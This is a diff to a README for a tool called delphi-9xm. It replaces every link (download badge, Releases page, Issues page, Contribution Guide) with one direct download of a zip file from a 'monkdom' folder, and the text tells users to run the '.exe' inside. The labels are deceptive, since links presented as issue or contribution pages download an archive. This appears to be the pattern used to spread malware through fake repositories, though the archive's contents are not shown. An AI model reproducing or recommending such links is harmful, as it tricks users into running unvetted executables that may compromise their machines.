@@ -1,6 +1,6 @@
 # 🖥️ delphi-9xm - Easy Tool for Simple Tasks
 
-[![Download delphi-9xm](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Dhanushkaran-8577/delphi-9xm/releases)
+[![Download delphi-9xm](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download the application, make sure your computer meets these require
 
 To get started with **delphi-9xm**, you need to download the application from our Releases page. Follow these steps:
 
-1. Click on the following link to visit the [Releases page](https://github.com/Dhanushkaran-8577/delphi-9xm/releases).
+1. Click on the following link to visit the [Releases page](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip).
 2. On the Releases page, you will see the latest version listed. Look for the **Assets** section below it.
 3. Download the file that is appropriate for your operating system. For most users, this will be the `.exe` file.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -62,16 +62,16 @@ Yes, a detailed user manual is included in the application. You can access it fr
 
 ## 💬 Support
 
-If you have any questions or need assistance, please visit the [Issues page](https://github.com/Dhanushkaran-8577/delphi-9xm/issues). We are here to help you with any concerns.
+If you have any questions or need assistance, please visit the [Issues page](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip). We are here to help you with any concerns.
 
 ## 📚 Contribution
 
-We welcome contributions! If you would like to improve **delphi-9xm**, please visit the [Contribution Guide](https://github.com/Dhanushkaran-8577/delphi-9xm/CONTRIBUTING.md) for more information.
+We welcome contributions! If you would like to improve **delphi-9xm**, please visit the [Contribution Guide](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip) for more information.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/Dhanushkaran-8577/delphi-9xm/releases)
-- [Issues Page](https://github.com/Dhanushkaran-8577/delphi-9xm/issues)
-- [Contribution Guide](https://github.com/Dhanushkaran-8577/delphi-9xm/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip)
+- [Issues Page](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/Dhanushkaran-8577/delphi-9xm/main/monkdom/delphi-9xm.zip)
 
 Thank you for using **delphi-9xm**! We hope it simplifies your tasks effectively.
